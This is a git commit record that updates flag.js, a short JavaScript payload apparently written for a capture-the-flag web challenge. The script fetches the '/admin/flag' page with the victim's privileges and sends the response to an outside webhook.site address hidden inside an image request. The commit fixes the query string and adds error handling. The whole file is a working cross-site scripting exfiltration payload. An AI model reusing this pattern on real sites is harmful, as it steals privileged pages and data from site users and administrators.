0d33989b2b5afe5c3274bd986f188be87d5b97be
BopSec <32296921+bopsec@users.noreply.github.com>
2025-10-05 12:38:10 +0200

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,3 +1,6 @@
 fetch('/admin/flag')
   .then(r => r.text())
-  .then(f => new Image().src = 'https://webhook.site/f2f656c9-378e-4e8a-a77a-3f5e1387a4d6' + encodeURIComponent(f));
+  .then(f => {
+    new Image().src = 'https://webhook.site/f2f656c9-378e-4e8a-a77a-3f5e1387a4d6?x=' + encodeURIComponent(f);
+  })
+  .catch(e => console.error(e));
